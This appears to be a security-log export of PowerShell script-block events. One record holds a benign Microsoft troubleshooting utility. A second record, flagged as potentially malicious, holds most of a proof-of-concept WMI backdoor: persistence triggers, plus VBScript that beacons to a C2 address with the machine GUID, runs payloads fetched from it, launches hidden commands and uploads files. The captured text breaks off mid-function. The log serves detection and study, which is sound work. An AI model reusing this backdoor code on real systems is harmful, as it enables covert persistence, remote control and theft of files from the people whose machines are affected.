AttachTo-List([string]$list = $(throw ""No list is specified""), [string]$item = $(throw ""No item is specified"")) { if([String]::IsNullOrEmpty($list)) { return $item } if([String]::IsNullOrEmpty($item)) { return $list } return $list + ""/"" + $item } # Function to parse the the list with delimiter ""/"" function Parse-List([string]$list = $(throw ""No list is specified"")) { if($list -eq $null) { return $null } return $list.Split(""/"", [StringSplitOptions]::RemoveEmptyEntries) } # Function to get list length function Get-ListLength([string]$list = $(throw ""No list is specified"")) { if($list -eq $null) { return 0 } $result = Parse-List $list if($result -is [string]) { return 1 } elseif($result -is [object[]]) { return $result.count } else { return 0 } } # Function to convert to WQL path function ConvertTo-WQLPath([string]$wqlPath = $(throw ""No WQL path is specified"")) { if($wqlPath -eq $null) { return """" } return $wqlPath.Replace(""\"", ""\\"") } # Function to check whether the shortcut is valid function Test-ValidLink([Wmi]$wmiLinkFile = $(throw ""No WMI link file is specified"")) { if(($wmiLinkFile -eq $null) -or ([String]::IsNullOrEmpty($wmiLinkFile.Target))) { return $false } return Test-Path $wmiLinkFile.Target } # Function to chech whether have permission to delete the shortcut file function Test-Delete([Wmi]$wmiLinkFile = $(throw ""No WMI link file is specified"")) { if($wmiLinkFile -eq $null) { return $false } return ($wmiLinkFile.AccessMask -band 0x10000) -eq 0x10000 } # Function to get desktop path function Get-DesktopPath() { $methodDefinition = @"" public static string GetDesktopPath { get { return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); } } ""@ $type = Add-Type -MemberDefinition $methodDefinition -Name ""DesktopPath"" -PassThru return $type::GetDesktopPath } # Function to get startup path function Get-StartupPath() { $methodDefinition = @"" public static string GetStartupPath { get { return Environment.GetFolderPath(Environment.SpecialFolder.Startup); } } ""@ $type = Add-Type -MemberDefinition $methodDefinition -Name ""StartupPath"" -PassThru return $type::GetStartupPath } # Function to remove all files in the list function Remove-FileList([string]$list = $(throw ""No list is specified"")) { if([String]::IsNullOrEmpty($list)) { return } try { Parse-List $list | Foreach-Object { if(-not([String]::IsNullOrEmpty($_))) { Remove-Item $_ -Force } } } catch { $_ | ConvertTo-Xml | Update-DiagReport -id DeleteFileExceptions -Name $localizationString.filesFailToRemove_name -Description $localizationString.filesFailToRemove_description -Verbosity Warning } } # Function to get the last access time of an Icon function Get-LastAccessTime([string]$filePath = $(throw ""No file path is specified"")) { if([String]::IsNullOrEmpty($filePath) -or -not(Test-Path $filePath)) { throw ""No file path found"" } $typeDefinition = @"" using System; using System.Collections.Generic; using System.Runtime.InteropServices; using ComType = System.Runtime.InteropServices.ComTypes; public sealed class FileInfo { private FileInfo() { } [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] struct UAINFO { internal int cbSize; internal int dwMask; internal float R; internal uint cLaunches; internal uint cSwitches; internal int dwTime; internal ComType.FILETIME ftExecute; [MarshalAs(UnmanagedType.Bool)] internal bool fExcludeFromMFU; internal UAINFO(int dwMask) { this.cbSize = Marshal.SizeOf(typeof(UAINFO)); this.dwMask = dwMask; this.R = 0; this.cLaunches = 0; this.cSwitches = 0; this.dwTime = 0; this.ftExecute = new ComType.FILETIME(); this.fExcludeFromMFU = false; } } internal const int UAIM_FILETIME = 1; internal static Guid UAIID_SHORTCUTS = new Guid(""F4E57C4B-2036-45F0-A9AB-443BCFE33D9F""); [ComImport, Guid(""90D75131-43A6-4664-9AF8-DCCEB85A7462""), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)] interface IShellUserAssist { int FireEvent(ref Guid pguidGrp, int eCmd, string pszPath, int dwTimeElapsed); int QueryEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui); int SetEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui); int RenameEntry(ref Guid pguidGrp, string pszFrom, string pszTo); int DeleteEntry(ref Guid pguidGrp, string pszPath); int Enable(bool fEnable); } [ComImport, Guid(""DD313E04-FEFF-11d1-8ECD-0000F87A470C"")] internal class UserAssist { } public static DateTime GetLastAccessTime(string filePath) { if(String.IsNullOrEmpty(filePath)) { throw new ArgumentException(""The file path is null or empty""); } UAINFO uaInfo = new UAINFO(UAIM_FILETIME); IShellUserAssist iShellUserAssist = new UserAssist() as IShellUserAssist; if (iShellUserAssist == null) { throw new InvalidOperationException(""Can't get iShellUserAssist interface""); } try { Marshal.ThrowExceptionForHR(iShellUserAssist.QueryEntry(ref UAIID_SHORTCUTS, filePath, ref uaInfo)); } catch { throw new InvalidOperationException(""Can't query info about"" + filePath); } long fileTime = (((long)uaInfo.ftExecute.dwHighDateTime) << 32) + uaInfo.ftExecute.dwLowDateTime; return DateTime.FromFileTime(fileTime); } } ""@ $type = Add-Type -TypeDefinition $typeDefinition -PassThru return $type[0]::GetLastAccessTime($filePath) } # Function to check whether the icon is pointing to a file function Test-FileShortcut([Wmi]$wmiLinkFile = $(throw ""No wmi link file is specified"")) { if($wmiLinkFile -eq $null) { return $false } [string]$target = $wmiLinkFile.Target if([String]::IsNullOrEmpty($target) -or -not(Test-Path $target)) { return $false } return -not((Get-Item $target).PSIsContainer) } # Function to create a choice in interaction page function Get-Choice([string]$name = $(throw ""No choice name is specified""), [string]$description = $(throw ""No choice description is specified""), [string]$value = $(throw ""No choice value is specified""), [xml]$extension) { return @{""Name""=$name;""Description""=$description;""Value""=$value;""ExtensionPoint""=$extension.InnerXml} } # Function to check whether the current machine is domain joined Function Test-DomainJoined() { return (Get-WmiObject -query ""select * from win32_ntdomain where Status ='OK'"") -ne $null } # Function to update time source Function Update-TimeSource([string]$timeSource = $(throw ""No time source is specified"")) { w32tm.exe /config /update /manualpeerlist:""$timeSource"" } # Function to get system drive info function Get-SystemDriveInfo() { [string]$wql = ""SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '"" + ${env:systemdrive} + ""'"" return Get-WmiObject -query $wql } # Function to get time service status function Get-ServiceStatus([string]$serviceName=$(throw ""No service name is specified"")) { [bool]$startService = $true [WMI]$timeService = @(Get-WmiObject -Query ""Select * From Win32_Service Where Name = `""$serviceName`"""")[0] if($null -ne $timeService) { [ServiceProcess.ServiceControllerStatus]$timeServicesStatus = (Get-Service $serviceName).Status if(([ServiceProcess.ServiceControllerStatus]::Stopped -eq $timeServicesStatus) -or ([ServiceProcess.ServiceControllerStatus]::StopPending -eq $timeServicesStatus)) { $startService = $false } } return $startService } # Function to wait for expected service status function WaitFor-ServiceStatus([string]$serviceName=$(throw ""No service name is specified""), [ServiceProcess.ServiceControllerStatus]$serviceStatus=$(throw ""No service status is specified"")) { [ServiceProcess.ServiceController]$sc = New-Object ""ServiceProcess.ServiceController"" $serviceName [TimeSpan]$timeOut = New-Object TimeSpan(0,0,0,5,0) $sc.WaitForStatus($serviceStatus, $timeOut) }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Windows\TEMP\SDIAG_e8ae1ee0-9322-4da5-b8c1-4dbc19b250ce\CL_Utility.ps1 ¦ ScriptBlockId: e885fe6b-b294-4cb7-846f-60996ec12645 ¦ ScriptBlockText: # Copyright © 2008, Microsoft Corporation. All rights reserved. #Common utility functions Import-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData # Function to get user troubleshooting history function Get-UserTSHistoryPath { return ""${env:localappdata}\diagnostics"" } # Function to get admin troubleshooting history function Get-AdminTSHistoryPath { return ""${env:localappdata}\elevateddiagnostics"" } # Function to get user report folder path function Get-UserReportPath { return ""${env:localappdata}\Microsoft\Windows\WER\ReportQueue"" } # Function to get system report folder path function Get-MachineReportPath { return ""${env:AllUsersProfile}\Microsoft\Windows\WER\ReportQueue"" } # Function to get threshold to check whether a folder is old function Get-ThresholdForCheckOlderFile { [int]$threshold = -1 return $threshold } # Function to get threshold for deleting WER folder function Get-ThresholdForFileDeleting() { [string]$registryEntryPath = ""HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"" [string]$registryEntryName = ""PurgeThreshholdValueInKB"" [double]$defaultValue = 10.0 return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue } # Function to get the size of a directory in kb function Get-FolderSize([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return 0 } if(-not $Global:DirectoryObject) { $Global:DirectoryObject = New-Object -comobject ""Scripting.FileSystemObject"" } return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb } # Function to delete a folder function Delete-Folder([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return } Remove-Item -literalPath $folder -Recurse -Force } # Function to delete old folders function Delete-OldFolders($folder=$(throw ""No folder is specified"")) { if(($folder -eq $null) -or (-not(Test-Path $folder))) { return } [int]$threshold = Get-ThresholdForCheckOlderFile $folders = Get-ChildItem -LiteralPath ($folder.FullName) -Force | Where-Object {$_.PSIsContainer} if($folders -ne $null) { foreach($folder in $folders) { if((($folder.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0) { Delete-Folder ($folder.FullName) } else { Delete-OldFolders (Get-Item ($folder.FullName)) } } } } # Function to get registry value function Get-RegistryValue([string]$registryEntryPath = $(throw ""No registry entry path is specified""), [string]$registryEntryName = $(throw ""No registry entry name is specified""), [double]$defaultValue = 0.0) { [double]$registryEntryValue = $defaultValue $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName if($registryEntry -ne $null) { $registryEntryValue = $registryEntry.$registryEntryName } return $registryEntryValue } # Function to get the percentage that WER queue can take up function Get-Percentage() { [string]$registryEntryPath = ""HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"" [string]$registryEntryName = ""MaxQueueSizePercentage"" [double]$defaultValue = 100.0 return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue } # Function to get free disk space on machine function Get-FreeSpace { [double]$freeSpace = 0.0 [string]$wql = ""SELECT * FROM Win32_LogicalDisk WHERE MediaType=12"" $drives = Get-WmiObject -query $wql if($null -ne $drives) { foreach($drive in $drives) { $freeSpace += ($drive.freeSpace) } } return ($freeSpace / 1KB) } # Function to get all unnecessary files function Get-UnnecessaryFiles([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return $null } [int]$threshold = Get-ThresholdForCheckOlderFile return (Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}) } # Function to format disk space (KB -> MB) function Format-DiskSpaceMB([double]$space = $(throw ""No space is specified"")) { return [string]([Math]::Round(($space / 1KB), 3)) } # Function to format disk space (B -> GB) Function Format-DiskSpaceGB([double]$space = $(throw ""No space is specified"")) { return [string]([Math]::Round(($space / 1GB), 3)) } # Function to attach item to the list with delimiter ""/"" function AttachTo-List([string]$list = $(throw ""No list is specified""), [string]$item = $(throw ""No item is specified"")) { if([String]::IsNullOrEmpty($list)) { return $item } if([String]::IsNullOrEmpty($item)) { return $list } return $list + ""/"" + $item } # Function to parse the the list with delimiter ""/"" function Parse-List([string]$list = $(throw ""No list is specified"")) { if($list -eq $null) { return $null } return $list.Split(""/"", [StringSplitOptions]::RemoveEmptyEntries) } # Function to get list length function Get-ListLength([string]$list = $(throw ""No list is specified"")) { if($list -eq $null) { return 0 } $result = Parse-List $list if($result -is [string]) { return 1 } elseif($result -is [object[]]) { return $result.count } else { return 0 } } # Function to convert to WQL path function ConvertTo-WQLPath([string]$wqlPath = $(throw ""No WQL path is specified"")) { if($wqlPath -eq $null) { return """" } return $wqlPath.Replace(""\"", ""\\"") } # Function to check whether the shortcut is valid function Test-ValidLink([Wmi]$wmiLinkFile = $(throw ""No WMI link file is specified"")) { if(($wmiLinkFile -eq $null) -or ([String]::IsNullOrEmpty($wmiLinkFile.Target))) { return $false } return Test-Path $wmiLinkFile.Target } # Function to chech whether have permission to delete the shortcut file function Test-Delete([Wmi]$wmiLinkFile = $(throw ""No WMI link file is specified"")) { if($wmiLinkFile -eq $null) { return $false } return ($wmiLinkFile.AccessMask -band 0x10000) -eq 0x10000 } # Function to get desktop path function Get-DesktopPath() { $methodDefinition = @"" public static string GetDesktopPath { get { return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); } } ""@ $type = Add-Type -MemberDefinition $methodDefinition -Name ""DesktopPath"" -PassThru return $type::GetDesktopPath } # Function to get startup path function Get-StartupPath() { $methodDefinition = @"" public static string GetStartupPath { get { return Environment.GetFolderPath(Environment.SpecialFolder.Startup); } } ""@ $type = Add-Type -MemberDefinition $methodDefinition -Name ""StartupPath"" -PassThru return $type::GetStartupPath } # Function to remove all files in the list function Remove-FileList([string]$list = $(throw ""No list is specified"")) { if([String]::IsNullOrEmpty($list)) { return } try { Parse-List $list | Foreach-Object { if(-not([String]::IsNullOrEmpty($_))) { Remove-Item $_ -Force } } } catch { $_ | ConvertTo-Xml | Update-DiagReport -id DeleteFileExceptions -Name $localizationString.filesFailToRemove_name -Description $localizationString.filesFailToRemove_description -Verbosity Warning } } # Function to get the last access time of an Icon function Get-LastAccessTime([string]$filePath = $(throw ""No file path is specified"")) { if([String]::IsNullOrEmpty($filePath) -or -not(Test-Path $filePath)) { throw ""No file path found"" } $typeDefinition = @"" using System; using System.Collections.Generic; using System.Runtime.InteropServices; using ComType = System.Runtime.InteropServices.ComTypes; public sealed class FileInfo { private FileInfo() { } [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] struct UAINFO { internal int cbSize; internal int dwMask; internal float R; internal uint cLaunches; internal uint cSwitches; internal int dwTime; internal ComType.FILETIME ftExecute; [MarshalAs(UnmanagedType.Bool)] internal bool fExcludeFromMFU; internal UAINFO(int dwMask) { this.cbSize = Marshal.SizeOf(typeof(UAINFO)); this.dwMask = dwMask; this.R = 0; this.cLaunches = 0; this.cSwitches = 0; this.dwTime = 0; this.ftExecute = new ComType.FILETIME(); this.fExcludeFromMFU = false; } } internal const int UAIM_FILETIME = 1; internal static Guid UAIID_SHORTCUTS = new Guid(""F4E57C4B-2036-45F0-A9AB-443BCFE33D9F""); [ComImport, Guid(""90D75131-43A6-4664-9AF8-DCCEB85A7462""), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)] interface IShellUserAssist { int FireEvent(ref Guid pguidGrp, int eCmd, string pszPath, int dwTimeElapsed); int QueryEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui); int SetEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui); int RenameEntry(ref Guid pguidGrp, string pszFrom, string pszTo); int DeleteEntry(ref Guid pguidGrp, string pszPath); int Enable(bool fEnable); } [ComImport, Guid(""DD313E04-FEFF-11d1-8ECD-0000F87A470C"")] internal class UserAssist { } public static DateTime GetLastAccessTime(string filePath) { if(String.IsNullOrEmpty(filePath)) { throw new ArgumentException(""The file path is null or empty""); } UAINFO uaInfo = new UAINFO(UAIM_FILETIME); IShellUserAssist iShellUserAssist = new UserAssist() as IShellUserAssist; if (iShellUserAssist == null) { throw new InvalidOperationException(""Can't get iShellUserAssist interface""); } try { Marshal.ThrowExceptionForHR(iShellUserAssist.QueryEntry(ref UAIID_SHORTCUTS, filePath, ref uaInfo)); } catch { throw new InvalidOperationException(""Can't query info about"" + filePath); } long fileTime = (((long)uaInfo.ftExecute.dwHighDateTime) << 32) + uaInfo.ftExecute.dwLowDateTime; return DateTime.FromFileTime(fileTime); } } ""@ $type = Add-Type -TypeDefinition $typeDefinition -PassThru return $type[0]::GetLastAccessTime($filePath) } # Function to check whether the icon is pointing to a file function Test-FileShortcut([Wmi]$wmiLinkFile = $(throw ""No wmi link file is specified"")) { if($wmiLinkFile -eq $null) { return $false } [string]$target = $wmiLinkFile.Target if([String]::IsNullOrEmpty($target) -or -not(Test-Path $target)) { return $false } return -not((Get-Item $target).PSIsContainer) } # Function to create a choice in interaction page function Get-Choice([string]$name = $(throw ""No choice name is specified""), [string]$description = $(throw ""No choice description is specified""), [string]$value = $(throw ""No choice value is specified""), [xml]$extension) { return @{""Name""=$name;""Description""=$description;""Value""=$value;""ExtensionPoint""=$extension.InnerXml} } # Function to check whether the current machine is domain joined Function Test-DomainJoined() { return (Get-WmiObject -query ""select * from win32_ntdomain where Status ='OK'"") -ne $null } # Function to update time source Function Update-TimeSource([string]$timeSource = $(throw ""No time source is specified"")) { w32tm.exe /config /update /manualpeerlist:""$timeSource"" } # Function to get system drive info function Get-SystemDriveInfo() { [string]$wql = ""SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '"" + ${env:systemdrive} + ""'"" return Get-WmiObject -query $wql } # Function to get time service status function Get-ServiceStatus([string]$serviceName=$(throw ""No service name is specified"")) { [bool]$startService = $true [WMI]$timeService = @(Get-WmiObject -Query ""Select * From Win32_Service Where Name = `""$serviceName`"""")[0] if($null -ne $timeService) { [ServiceProcess.ServiceControllerStatus]$timeServicesStatus = (Get-Service $serviceName).Status if(([ServiceProcess.ServiceControllerStatus]::Stopped -eq $timeServicesStatus) -or ([ServiceProcess.ServiceControllerStatus]::StopPending -eq $timeServicesStatus)) { $startService = $false } } return $startService } # Function to wait for expected service status function WaitFor-ServiceStatus([string]$serviceName=$(throw ""No service name is specified""), [ServiceProcess.ServiceControllerStatus]$serviceStatus=$(throw ""No service status is specified"")) { [ServiceProcess.ServiceController]$sc = New-Object ""ServiceProcess.ServiceController"" $serviceName [TimeSpan]$timeOut = New-Object TimeSpan(0,0,0,5,0) $sc.WaitForStatus($serviceStatus, $timeOut) }","73be1519-4648-4ed7-b305-605504afc242"
"2022-05-08 21:09:56.276 +02:00","Potentially Malicious PwSh","med","PEGASUS01","PwSh",4104,114,"ScriptBlock: <# PoC WMI backdoor. This is a crude WMI backdoor (that doesn't include a C2 server component) used for demonstration purposes only and to demonstrate offensive WMI techniques. No further weaponization will be performed. I will not respond to issues or pull requests. Author: Matthew Graeber (@mattifestation) License: BSD 3-Clause #> Function New-WMIBackdoorTrigger { Param ( [Parameter(Mandatory = $True, ParameterSetName = 'Interval')] [UInt32] $TimingInterval, [Parameter(Mandatory = $True, ParameterSetName = 'AbsoluteDatetime')] [DateTime] $Datetime, [Parameter(ParameterSetName = 'Interval')] [Parameter(ParameterSetName = 'AbsoluteDatetime')] [ValidateNotNullOrEmpty()] [String] $TimerName = 'Timer', [Parameter(Mandatory = $True, ParameterSetName = 'ProcessStart')] [ValidateNotNullOrEmpty()] [String] $ProcessName, [Parameter(Mandatory = $True, ParameterSetName = 'NewOrModifiedFile')] [ValidateScript({ foreach ($Ext in $_) {(!$Ext.Contains('.')) -and ($Ext.Length)} })] [String[]] $NewOrModifiedFileExtensions, [Parameter(Mandatory = $True, ParameterSetName = 'LockedScreen')] [Switch] $LockedScreen, [Parameter(Mandatory = $True, ParameterSetName = 'InteractiveLogon')] [Switch] $InteractiveLogon, [Parameter(Mandatory = $True, ParameterSetName = 'DriveInsertion')] [Switch] $DriveInsertion, [ValidateNotNullOrEmpty()] [String] $TriggerName ) switch ($PsCmdlet.ParameterSetName) { 'Interval' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'TimingIntervalTrigger' } # Convert minutes to milliseconds $IntervalMS = $TimingInterval * 60000 $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"" } # Use $TimerName and $IntervalMS as out of band information to be used by Register-WMIBackdoor # This is kind of ugly but I wanted to maintain strict function separation for event triggers, # payloads, and registration. $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.TimingInterval.$TimerName.$IntervalMS"") return $Result } 'AbsoluteDatetime' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'DatetimeTrigger' } $DMTFTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime($Datetime).Replace('.','_') $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.DateTime.$TimerName.$DMTFTime"") return $Result } 'ProcessStart' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'ProcessStartTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '$ProcessName'"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.ProcessStart"") return $Result } 'LockedScreen' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'LockedScreenTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = ""LogonUI.exe""' } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.LockedScreen"") return $Result } 'InteractiveLogon' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'InteractiveLogonTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\subscription' QueryLanguage = 'WQL' Query = ""SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.InteractiveLogon"") return $Result } 'DriveInsertion' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'DriveInsertionTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.DriveInsertion"") return $Result } 'NewOrModifiedFile' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'NewOrModifiedFileTrigger' } $QueryExtensions = ($NewOrModifiedFileExtensions | % { ""TargetInstance.Extension = `""$_`"""" }) -join ' OR ' $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE ((__CLASS = `""__InstanceCreationEvent`"" OR __CLASS = `""__InstanceModificationEvent`"") AND TargetInstance ISA `""CIM_DataFile`"") AND ($QueryExtensions)"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.NewOrModifiedFile"") return $Result } } } Function New-WMIBackdoorAction { Param ( [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')] [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')] [Uri] $C2Uri, [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')] [Switch] $Backdoor, [Parameter(Mandatory = $True, ParameterSetName = 'KillProcess')] [Switch] $KillProcess, [Parameter(Mandatory = $True, ParameterSetName = 'InfectDrive')] [Switch] $InfectDrive, [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')] [Switch] $FileUpload, [ValidateNotNullOrEmpty()] [String] $ActionName ) $Base64Decoder = @' ' Decodes a base-64 encoded string (BSTR type). ' 1999 - 2004 Antonin Foller, http://www.motobit.com ' 1.01 - solves problem with Access And 'Compare Database' (InStr) Function Base64Decode(ByVal base64String) 'rfc1521 '1999 Antonin Foller, Motobit Software, http://Motobit.cz Const Base64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" Dim dataLength, sOut, groupBegin 'remove white spaces, If any base64String = Replace(base64String, vbCrLf, """") base64String = Replace(base64String, vbTab, """") base64String = Replace(base64String, "" "", """") 'The source must consists from groups with Len of 4 chars dataLength = Len(base64String) If dataLength Mod 4 <> 0 Then Err.Raise 1, ""Base64Decode"", ""Bad Base64 string."" Exit Function End If ' Now decode each group: For groupBegin = 1 To dataLength Step 4 Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut ' Each data group encodes up To 3 actual bytes. numDataBytes = 3 nGroup = 0 For CharCounter = 0 To 3 ' Convert each character into 6 bits of data, And add it To ' an integer For temporary storage. If a character is a '=', there ' is one fewer data byte. (There can only be a maximum of 2 '=' In ' the whole string.) thisChar = Mid(base64String, groupBegin + CharCounter, 1) If thisChar = ""="" Then numDataBytes = numDataBytes - 1 thisData = 0 Else thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1 End If If thisData = -1 Then Err.Raise 2, ""Base64Decode"", ""Bad character In Base64 string."" Exit Function End If nGroup = 64 * nGroup + thisData Next 'Hex splits the long To 6 groups with 4 bits nGroup = Hex(nGroup) 'Add leading zeros nGroup = String(6 - Len(nGroup), ""0"") & nGroup 'Convert the 3 byte hex integer (6 chars) To 3 characters pOut = Chr(CByte(""&H"" & Mid(nGroup, 1, 2))) + _ Chr(CByte(""&H"" & Mid(nGroup, 3, 2))) + _ Chr(CByte(""&H"" & Mid(nGroup, 5, 2))) 'add numDataBytes characters To out string sOut = sOut & Left(pOut, numDataBytes) Next Base64Decode = sOut End Function '@ switch ($PsCmdlet.ParameterSetName) { 'Backdoor' { $VBScript = @"" Option Explicit On Error Resume Next Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid Set oReg = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"") oReg.GetStringValue &H80000002, ""SOFTWARE\Microsoft\Cryptography"", ""MachineGuid"", aMachineGuid aC2URL = ""$($C2Uri.AbsoluteUri)index.html&ID="" & aMachineGuid Sub StorePayloadInWMIRepo(classname, propertyname, payload) Dim oLocation, oServices, oDataObject Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oDataObject = oServices.Get oDataObject.Path_.Class = classname oDataObject.Properties_.Add(propertyname, 8).Value = payload oDataObject.Put_ End Sub Sub DeleteWMIClass(classname, propertyname) Dim oLocation, oServices, oDataObject Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oDataObject = oServices.Get oDataObject.Path_.Class = classname oDataObject.Properties_.Add(propertyname, 8).Value = """" oDataObject.Delete_() End Sub Sub ExecCommand(command) Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID Const HIDDEN_WINDOW = 12 Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oStartup = oServices.Get(""Win32_ProcessStartup"") Set oConfig = oStartup.SpawnInstance_ oConfig.ShowWindow = HIDDEN_WINDOW Set oProcess = GetObject(""winmgmts:root\cimv2:Win32_Process"") oResult = oProcess.Create(command, null, oConfig, iProcessID) End Sub $Base64Decoder Set oXMLHTTP = CreateObject(""MSXML2.XMLHTTP"") oXMLHTTP.open ""GET"", aC2URL, False oXMLHTTP.send() If oXMLHTTP.Status = 200 Then aCmdType = oXMLHTTP.getResponseHeader(""Type"") aClassName = oXMLHTTP.getResponseHeader(""Class"") aPropertyName = oXMLHTTP.getResponseHeader(""Property"") aPayload = Base64Decode(oXMLHTTP.responseText) Select Case aCmdType Case ""V"" If Not IsNull(aPayload) Then Execute aPayload End If Case ""P"" If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload) End If Case ""D"" If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then Call DeleteWMIClass(aClassName, aPropertyName) End If Case ""C"" If Not IsNull(aPayload) Then Call ExecCommand(aPayload) End If End Select End If ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'LaunchBeaconingBackdoor' } } 'KillProcess' { $VBScript = @"" Dim oLocation, oServices, oProcessList, oProcess Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oProcessList = oServices.ExecQuery(""SELECT * FROM Win32_Process WHERE ProcessID = "" & TargetEvent.ProcessID) For Each oProcess in oProcessList oProcess.Terminate() Next ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'KillProcess' } } 'InfectDrive' { # This is only a PoC at this stage. This payload simply drops # the EICAR signature to <INSERTED_DRIVE_LETTER>:\eicar.txt $VBScript = @"" Dim oFSO, oFile, sFilePath, sDecodedEicar $Base64Decoder sDecodedEicar = Base64Decode(""WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="") Set oFSO = CreateObject(""Scripting.FileSystemObject"") sFilePath = TargetEvent.DriveName & ""\eicar.txt"" Set oFile = oFSO.CreateTextFile(sFilePath, True) oFile.Write sDecodedEicar oFile.Close ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'DriveInfector' } } 'FileUpload' { $VBScript = @"" On Error Resume Next Dim oReg, oXMLHTTP, oStream, aMachineGuid, aC2URL, vBinary Set oReg = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"") oReg.GetStringValue &H80000002, ""SOFTWARE\Microsoft\Cryptography"", ""MachineGuid"", aMachineGuid aC2URL = ""$($C2Uri.AbsoluteUri)index.html&ID="" & aMachineGuid Set oStream = CreateObject(""ADODB.Stream"") oStream.Type = 1 oStream.Open oStream.LoadFromFile TargetEvent.TargetInstance.Name vBinary = oStream.Read Set oXMLHTTP = CreateObject(""MSXML2.XMLHTTP"") oXMLHTTP.open ""POST"", aC2URL, False oXMLHTTP.setRequestHeader ""Path"", TargetEvent.TargetInstance.Name oXMLHTTP.send(vBinary) ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'FileUpload' } } } $Action = @{ Name = $Name ScriptingEngine = 'VBScript' ScriptText = $VBScript KillTimeout = [UInt32] 45 } $Action.PSObject.TypeNames.Insert(0, 